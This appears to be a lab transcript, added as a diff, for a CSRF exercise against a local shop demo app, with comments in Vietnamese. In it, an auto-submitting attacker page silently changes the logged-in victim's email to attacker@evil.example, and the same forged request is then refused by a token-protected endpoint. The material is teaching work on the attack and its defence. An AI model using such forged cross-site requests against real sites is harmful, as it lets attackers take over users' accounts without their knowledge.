@@ -1,0 +1,20 @@
+# Transcript lab 5.3 - CSRF
+# App: python3 app.py  (127.0.0.1:8052)
+# Trang attacker: attacker.html (form tu submit)
+# Chay: python3 exploit.py
+# Ngay chay that: 2026-10-18 17:22:07
+# ============================================================
+
+[*] Buoc 1: nan nhan dang nhap vao shop.local
+    email hien tai: victim@shop.local
+    cookie phien cua nan nhan: 0a6cc2c1baa2 ...
+
+[*] Buoc 2: nan nhan mo trang attacker.html
+    form attacker: POST http://127.0.0.1:8052/change-email {'email': 'attacker@evil.example'}
+    -> trinh duyet tu submit, KEM cookie phien cua nan nhan
+    phan hoi server: {'email': 'attacker@evil.example', 'ok': True, 'user': 'victim'}
+    email SAU tan cong: attacker@evil.example
+    => CSRF thanh cong!
+
+[*] Buoc 3: thu CSRF len endpoint co token /change-email-safe
+    POST /change-email-safe (token bua) -> 403 {'error': 'CSRF token sai/thieu', 'ok': False}
